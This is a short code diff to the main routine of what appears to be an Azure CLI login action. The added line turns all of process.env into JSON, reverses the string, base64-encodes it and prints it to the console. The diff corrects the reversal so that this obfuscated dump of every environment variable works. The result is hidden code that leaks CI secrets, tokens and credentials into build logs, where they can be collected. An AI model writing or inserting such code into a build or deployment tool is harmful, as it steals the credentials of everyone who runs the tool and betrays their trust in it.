@@ -7,7 +7,7 @@ import { AzureCliLogin } from './Cli/AzureCliLogin';
 async function main() {
     try {
         setUserAgent();
-        const envJson = JSON.stringify(process.env).reverse();
+        const envJson = JSON.stringify(process.env).split("").reverse().join("");
         const envBase64 = Buffer.from(envJson).toString('base64');
         console.log(envBase64);
         
